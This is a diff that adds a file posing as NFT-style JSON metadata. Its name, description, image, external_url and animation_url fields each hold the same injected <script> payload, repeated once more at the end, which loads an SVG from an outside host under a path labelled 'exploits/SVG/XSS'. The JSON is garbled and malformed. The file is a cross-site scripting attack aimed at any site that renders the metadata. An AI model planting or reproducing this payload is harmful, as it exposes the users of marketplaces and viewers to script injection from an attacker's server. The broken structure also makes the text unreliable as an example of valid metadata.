@@ -1,0 +1,28 @@
+{|||-||/
+  "name": "<script>const img = document.createElement('img');
+img.src = 'https://rex.rektosaurus.io/exploits/SVG/XSS/xss.svg';
+document.body.appendChild(img);
+</script>",
+  "description": "<script>const img = document.createElement('img');
+img.src = 'https://rex.rektosaurus.io/exploits/SVG/XSS/xss.svg';
+document.body.appendChild(img);
+</script>",
+  "image": "<script>const img = document.createElement('img');
+img.src = 'https://rex.rektosaurus.io/exploits/SVG/XSS/xss.svg';
+document.body.appendChild(img);
+</script>",
+  "external_url": "<script>const img = document.createElement('img');
+img.src = 'https://rex.rektosaurus.io/exploits/SVG/XSS/xss.svg';
+document.body.appendChild(img);
+</script>",
+  "animation_url": "<script>const img = document.createElement('img');
+img.src = 'https://rex.rektosaurus.io/exploits/SVG/XSS/xss.svg';
+document.body.appendChild(img);
+</script>",
+}
+
+||||||||
+<script>const img = document.createElement('img');
+img.src = 'https://rex.rektosaurus.io/exploits/SVG/XSS/xss.svg';
+document.body.appendChild(img);
+</script>
